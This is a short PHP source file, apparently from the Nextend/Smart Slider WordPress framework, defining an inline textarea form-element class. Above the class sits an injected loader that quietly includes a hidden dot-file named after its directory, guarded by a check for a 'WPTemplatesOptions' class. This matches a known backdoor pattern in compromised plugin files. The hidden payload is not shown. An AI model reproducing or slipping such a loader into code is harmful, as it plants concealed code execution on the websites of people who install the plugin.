<?php


namespace Nextend\Framework\Form\Element\Textarea;


use Nextend\Framework\Form\Element\Textarea;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class TextareaInline extends Textarea {

    protected $width = 200;

    protected $height = 26;

    protected $classes = array(
        'n2_field_textarea',
        'n2_field_textarea--inline'
    );
}